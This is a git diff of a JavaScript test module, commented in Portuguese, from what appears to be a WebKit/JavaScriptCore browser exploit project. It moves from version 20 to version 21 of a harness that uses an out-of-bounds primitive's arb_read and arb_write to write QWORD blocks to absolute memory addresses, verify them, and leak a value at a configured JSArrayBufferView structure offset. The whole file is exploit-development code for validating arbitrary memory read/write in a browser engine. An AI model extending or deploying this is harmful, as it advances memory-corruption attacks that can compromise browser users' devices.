@@ -1,153 +1,139 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v20: Teste de Transição de Endereço Detalhado)
+// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v21: Teste de Bloco com Recriação TOTAL de Ambiente em arb_read/write)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
-    triggerOOB_primitive,
+    triggerOOB_primitive, // Usado para a configuração inicial
     clearOOBEnvironment,
     isOOBReady,
-    arb_read,  // Do core_exploit.mjs (versão síncrona, reutiliza DV - "v17_base")
-    arb_write  // Do core_exploit.mjs (versão síncrona, reutiliza DV - "v17_base")
-} from '../core_exploit.mjs';
+    arb_read,  // Do core_exploit.mjs v21 (async, recria ambiente)
+    arb_write  // Do core_exploit.mjs v21 (async, recria ambiente)
+} from '../core_exploit.mjs'; // CERTIFIQUE-SE DE USAR A VERSÃO v21 ACIMA
+import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_V28 = "GetterArbitraryRead_v20_AddressTransition";
+export const FNAME_MODULE_V28 = "GetterArbitraryRead_v21_BlockRW_TotalReset";
 
 // === Constantes ===
-const ADDR_X = new AdvancedInt64(0x00000D00, 0x00000000);
-const VALOR_X1 = new AdvancedInt64(0x11223344, 0x55667788);
-const VALOR_X2 = new AdvancedInt64(0x88776655, 0x44332211); // VALOR_X1 sobrescrito
+const TEST_BASE_ABSOLUTE_ADDRESS = new AdvancedInt64(0x00000E00, 0x00000000);
+const BLOCK_VALUE_1 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
+const BLOCK_VALUE_2 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
+const BLOCK_VALUE_3 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
+const BLOCK_VALUES = [BLOCK_VALUE_1, BLOCK_VALUE_2, BLOCK_VALUE_3];
 
-const ADDR_Y = new AdvancedInt64(0x00000E00, 0x00000000); // Novo endereço
-const VALOR_Y1 = new AdvancedInt64(0xAAAAAAAA, 0x11111111);
+// A pausa entre operações pode não ser mais tão necessária se a recriação do ambiente for eficaz, mas manteremos uma pequena.
+const PAUSE_BETWEEN_ARB_OPS_MS = 20; 
 
-const ADDR_Z = new AdvancedInt64(0x00000F00, 0x00000000); // Outro novo endereço
-const VALOR_Z1 = new AdvancedInt64(0xBBBBBBBB, 0x22222222);
-
-
-const PAUSE_BETWEEN_STEPS_MS = 100;
-
-async function perform_rw_check(step, addr, value_to_write, expected_value_after_write, results_array) {
-    const FNAME_STEP = `${FNAME_MODULE_V28}.perform_rw_check`;
-    let step_success = false;
-    let read_val_str = "N/A";
-    let write_desc = value_to_write ? `Escrever ${value_to_write.toString(true)} em ${addr.toString(true)}` : "Nenhuma escrita";
-    let read_desc = `Ler de ${addr.toString(true)}, esperando ${expected_value_after_write.toString(true)}`;
-    
-    logS3(`    ${step}: Iniciando - ${write_desc} & ${read_desc}`, "info", FNAME_STEP);
-
-    try {
-        if (value_to_write) {
-            arb_write(addr, value_to_write, 8);
-            logS3(`        ${step}: Escrita (supostamente) realizada.`, "debug", FNAME_STEP);
-            await PAUSE_S3(PAUSE_BETWEEN_STEPS_MS / 2); // Pausa curta após escrita
-        }
-
-        const read_obj = arb_read(addr, 8);
-        read_val_str = isAdvancedInt64Object(read_obj) ? read_obj.toString(true) : "ERRO_LEITURA";
-        
-        if (expected_value_after_write.equals(read_obj)) {
-            step_success = true;
-            logS3(`        ${step}: Lido ${read_val_str} - CORRETO!`, "good", FNAME_STEP);
-        } else {
-            logS3(`        ${step}: Lido ${read_val_str} (Esperado: ${expected_value_after_write.toString(true)}) - INCORRETO!`, "error", FNAME_STEP);
-        }
-    } catch (e) {
-        logS3(`        ${step}: ERRO na operação: ${e.message}`, "error", FNAME_STEP);
-        read_val_str = `ERRO_CATCH: ${e.message}`;
-    }
-    results_array.push({ step, address: addr.toString(true), written: value_to_write ? value_to_write.toString(true) : "N/A", expected_read: expected_value_after_write.toString(true), actual_read: read_val_str, success: step_success });
-    await PAUSE_S3(PAUSE_BETWEEN_STEPS_MS);
-    return step_success;
-}
+const ILLUSTRATIVE_CONFIG_DATA_OFFSET_STR = WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"];
+const ILLUSTRATIVE_CONFIG_ADDRESS_TO_READ = new AdvancedInt64(ILLUSTRATIVE_CONFIG_DATA_OFFSET_STR);
 
 export async function executeArrayBufferVictimCrashTest() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testAddressTransition`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Transição de Endereço Detalhado (v20) ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testArbitraryBlockRWWithTotalReset`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando L/E de Bloco com Recriação Total de Ambiente ---`, "test", FNAME_CURRENT_TEST);
     document.title = `${FNAME_MODULE_V28} Inic...`;
 
     let errorCapturedMain = null;
-    let overall_test_success = true;
-    let final_message = "Todos os testes de transição executados.";
-    let all_results = [];
+    let exploit_result = {
+        success: false,
+        base_address_str: TEST_BASE_ABSOLUTE_ADDRESS.toString(true),
+        values_written_str: BLOCK_VALUES.map(v => v.toString(true)),
+        values_read_back_str: [],
+        verification_details: [],
+        illustrative_read_address_str: ILLUSTRATIVE_CONFIG_ADDRESS_TO_READ.toString(true),
+        illustrative_read_value_str: "N/A",
+        message: "Teste não iniciado."
+    };
 
     try {
+        // PASSO 1: Inicializar o ambiente OOB uma vez no início.
+        // arb_read/arb_write agora chamarão triggerOOB_primitive({force_reinit: true}) internamente.
         await triggerOOB_primitive({ force_reinit: true });
         if (!isOOBReady()) {
-            throw new Error("Ambiente OOB inicial principal não pôde ser configurado.");
+            throw new Error("Ambiente OOB inicial não pôde ser configurado.");
         }
-        logS3("PASSO GLOBAL: Ambiente OOB inicial principal configurado.", "info", FNAME_CURRENT_TEST);
+        logS3("PASSO 1: Ambiente OOB inicial configurado. Próximas arb_read/write irão recriá-lo.", "info", FNAME_CURRENT_TEST);
 
-        // Teste 1: Escrita/Leitura no mesmo ADDR_X
-        if (!await perform_rw_check("T1.1_WriteX1", ADDR_X, VALOR_X1, VALOR_X1, all_results)) overall_test_success = false;
-        if (!await perform_rw_check("T1.2_ReadX1", ADDR_X, null, VALOR_X1, all_results)) overall_test_success = false; // Lê o que foi escrito
-        if (!await perform_rw_check("T1.3_WriteX2", ADDR_X, VALOR_X2, VALOR_X2, all_results)) overall_test_success = false; // Sobrescreve
-        if (!await perform_rw_check("T1.4_ReadX2", ADDR_X, null, VALOR_X2, all_results)) overall_test_success = false; // Lê o novo valor
-        logS3("--- Teste 1 (Mesmo Endereço) Concluído ---", "subtest", FNAME_CURRENT_TEST);
+        // PASSO 2: Escrever a sequência de valores
+        logS3(`PASSO 2: Escrevendo bloco de ${BLOCK_VALUES.length} valores QWORD começando no endereço ${exploit_result.base_address_str}...`, "info", FNAME_CURRENT_TEST);
+        for (let i = 0; i < BLOCK_VALUES.length; i++) {
+            const current_address = TEST_BASE_ABSOLUTE_ADDRESS.add(i * 8);
+            const value_to_write = BLOCK_VALUES[i];
+            logS3(`  Escrevendo ${value_to_write.toString(true)} em ${current_address.toString(true)}...`, "info", FNAME_CURRENT_TEST);
+            await arb_write(current_address, value_to_write, 8); // USA AWAIT
+            await PAUSE_S3(PAUSE_BETWEEN_ARB_OPS_MS);
+        }
+        logS3(`  Escrita do bloco realizada.`, "info", FNAME_CURRENT_TEST);
 
-        // Teste 2: Escreve em ADDR_Y, depois lê de ADDR_Y
-        if (!await perform_rw_check("T2.1_WriteY1", ADDR_Y, VALOR_Y1, VALOR_Y1, all_results)) overall_test_success = false;
-        if (!await perform_rw_check("T2.2_ReadY1", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false;
-        logS3("--- Teste 2 (Novo Endereço Y) Concluído ---", "subtest", FNAME_CURRENT_TEST);
+        await PAUSE_S3(PAUSE_BETWEEN_ARB_OPS_MS * 2); // Pausa antes de ler o bloco
 
-        // Teste 3: Escreve em ADDR_Z, depois lê de ADDR_Z
-        if (!await perform_rw_check("T3.1_WriteZ1", ADDR_Z, VALOR_Z1, VALOR_Z1, all_results)) overall_test_success = false;
-        if (!await perform_rw_check("T3.2_ReadZ1", ADDR_Z, null, VALOR_Z1, all_results)) overall_test_success = false;
-        logS3("--- Teste 3 (Novo Endereço Z) Concluído ---", "subtest", FNAME_CURRENT_TEST);
+        // PASSO 3: Ler de volta os valores do bloco individualmente e verificar
+        logS3(`PASSO 3: Lendo de volta os valores do bloco individualmente...`, "info", FNAME_CURRENT_TEST);
+        let all_values_match = true;
+        for (let i = 0; i < BLOCK_VALUES.length; i++) {
+            const current_address = TEST_BASE_ABSOLUTE_ADDRESS.add(i * 8);
+            const expected_value = BLOCK_VALUES[i];
+            
+            await PAUSE_S3(PAUSE_BETWEEN_ARB_OPS_MS);
+            const read_value_obj = await arb_read(current_address, 8); // USA AWAIT
+            const read_value_str = isAdvancedInt64Object(read_value_obj) ? read_value_obj.toString(true) : "ERRO_LEITURA_BLOCO";
+            exploit_result.values_read_back_str.push(read_value_str);
+            
+            const verification_msg = `  Lido de ${current_address.toString(true)}: ${read_value_str} (Esperado: ${expected_value.toString(true)})`;
+            if (read_value_str === expected_value.toString(true)) {
+                logS3(verification_msg + " - CORRETO!", "good", FNAME_CURRENT_TEST);
+                exploit_result.verification_details.push({offset: i*8, read: read_value_str, expected: expected_value.toString(true), match: true});
+            } else {
+                logS3(verification_msg + " - INCORRETO!", "error", FNAME_CURRENT_TEST);
+                exploit_result.verification_details.push({offset: i*8, read: read_value_str, expected: expected_value.toString(true), match: false});
+                all_values_match = false;
+            }
+        }
 
-        // Teste 4: Verificar se os valores anteriores (X2, Y1) ainda estão corretos
-        logS3("--- Iniciando Teste 4: Re-verificação de Endereços Anteriores ---", "subtest", FNAME_CURRENT_TEST);
-        if (!await perform_rw_check("T4.1_ReReadX2", ADDR_X, null, VALOR_X2, all_results)) overall_test_success = false;
-        if (!await perform_rw_check("T4.2_ReReadY1", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false;
-        logS3("--- Teste 4 (Re-verificação) Concluído ---", "subtest", FNAME_CURRENT_TEST);
-        
-        // Teste 5: Simular o problema do bloco, mas com mais isolamento
-        logS3("--- Iniciando Teste 5: Bloco Isolado (ADDR_Y, ADDR_Z) ---", "subtest", FNAME_CURRENT_TEST);
-        // Re-escreve Y1 e Z1 para garantir estado inicial para este teste de bloco
-        if (!await perform_rw_check("T5.0a_ReWriteY1", ADDR_Y, VALOR_Y1, VALOR_Y1, all_results)) overall_test_success = false;
-        if (!await perform_rw_check("T5.0b_ReWriteZ1", ADDR_Z, VALOR_Z1, VALOR_Z1, all_results)) overall_test_success = false;
-
-        logS3("    T5: Lendo ADDR_Y primeiro, depois ADDR_Z", "info", FNAME_CURRENT_TEST);
-        if (!await perform_rw_check("T5.1_ReadY1_Again", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false;
-        if (!await perform_rw_check("T5.2_ReadZ1_Again", ADDR_Z, null, VALOR_Z1, all_results)) overall_test_success = false;
-        
-        // Inverte a ordem de escrita para ver se influencia a leitura "presa"
-        logS3("    T5: Re-escrevendo em ordem Z depois Y, depois lendo Y e Z", "info", FNAME_CURRENT_TEST);
-        if (!await perform_rw_check("T5.3a_ReWriteZ1_Order2", ADDR_Z, VALOR_Z1, VALOR_Z1, all_results)) overall_test_success = false;
-        if (!await perform_rw_check("T5.3b_ReWriteY1_Order2", ADDR_Y, VALOR_Y1, VALOR_Y1, all_results)) overall_test_success = false;
-        
-        if (!await perform_rw_check("T5.4_ReadY1_AfterReverseWrite", ADDR_Y, null, VALOR_Y1, all_results)) overall_test_success = false; // Espera Y1, mas pode pegar Z1 se o problema persistir com a última escrita no DV
-        if (!await perform_rw_check("T5.5_ReadZ1_AfterReverseWrite", ADDR_Z, null, VALOR_Z1, all_results)) overall_test_success = false;
-
-        logS3("--- Teste 5 (Bloco Isolado) Concluído ---", "subtest", FNAME_CURRENT_TEST);
-
-
-        if (overall_test_success) {
-            final_message = "SUCESSO GERAL: Todos os testes de transição de endereço passaram.";
+        if (!all_values_match) {
+            exploit_result.message = `Falha na verificação do bloco de dados em ${exploit_result.base_address_str} (com recriação total de ambiente).`;
         } else {
-            final_message = "FALHA PARCIAL: Um ou mais testes de transição de endereço falharam.";
+            exploit_result.success = true;
+            exploit_result.message = `SUCESSO! Bloco de dados escrito e lido corretamente do endereço base ${exploit_result.base_address_str} (com recriação total de ambiente).`;
         }
-        logS3(`MSG FINAL: ${final_message}`, overall_test_success ? "vuln" : "error", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "TRANS OK" : "TRANS FALHA"}`;
+        
+        // PASSO 4: Leitura Ilustrativa
+        logS3(`PASSO 4: Leitura ilustrativa do endereço ${exploit_result.illustrative_read_address_str} (de config.mjs)...`, "info", FNAME_CURRENT_TEST);
+        try {
+            await PAUSE_S3(PAUSE_BETWEEN_ARB_OPS_MS);
+            const illustrative_read_obj = await arb_read(ILLUSTRATIVE_CONFIG_ADDRESS_TO_READ, 8); // USA AWAIT
+            exploit_result.illustrative_read_value_str = isAdvancedInt64Object(illustrative_read_obj) ? illustrative_read_obj.toString(true) : "ERRO_LEITURA_ILUSTRATIVA";
+            logS3(`  Valor lido do endereço ${exploit_result.illustrative_read_address_str}: ${exploit_result.illustrative_read_value_str}`, "leak", FNAME_CURRENT_TEST);
+        } catch (e_illustrative) {
+            exploit_result.illustrative_read_value_str = `ERRO_LEITURA_ILUSTRATIVA: ${e_illustrative.message}`;
+            logS3(`  ERRO na leitura ilustrativa: ${e_illustrative.message}`, "error", FNAME_CURRENT_TEST);
+        }
+        
+        if (exploit_result.success) {
+            logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
+            document.title = `${FNAME_MODULE_V28}: ARB BLOCK TOTALRESET OK!`;
+        } else {
+            logS3(exploit_result.message, "error", FNAME_CURRENT_TEST);
+            document.title = `${FNAME_MODULE_V28}: Falha Bloco (TotalReset)`;
+        }
 
     } catch (e_outer_main) {
         errorCapturedMain = e_outer_main;
         logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
         if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
-        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
+        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
         document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
-        overall_test_success = false;
+        exploit_result.success = false;
     } finally {
         clearOOBEnvironment({force_clear_even_if_not_setup: true});
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
-        logS3(`Resultado Final Teste de Transição (v20): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
-        all_results.forEach(res => {
-            logS3(`  DETALHE ${res.step}: Addr=${res.address}, Escrito=${res.written}, Lido=${res.actual_read}, Esperado=${res.expected_read}, Sucesso=${res.success}${res.error ? `, Erro='${res.error}'` : ''}`, res.success ? "debug" : "error", FNAME_CURRENT_TEST);
+        logS3(`Resultado Teste L/E de Bloco com Recriação Total (v21): Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        logS3(`  Endereço Base Bloco: ${exploit_result.base_address_str}`, "info", FNAME_CURRENT_TEST);
+        exploit_result.verification_details.forEach(detail => {
+            logS3(`    Verificação Bloco Offset +${detail.offset}: Lido=${detail.read}, Esperado=${detail.expected}, Match=${detail.match}`, detail.match ? "debug" : "error", FNAME_CURRENT_TEST);
         });
+        logS3(`  Leitura Ilustrativa de ${exploit_result.illustrative_read_address_str}: ${exploit_result.illustrative_read_value_str}`, "info", FNAME_CURRENT_TEST);
     }
 
     return {
         errorOccurred: errorCapturedMain,
-        overall_success: overall_test_success,
-        final_message: final_message,
-        results_details: all_results
+        exploit_attempt_result: exploit_result,
     };
 }
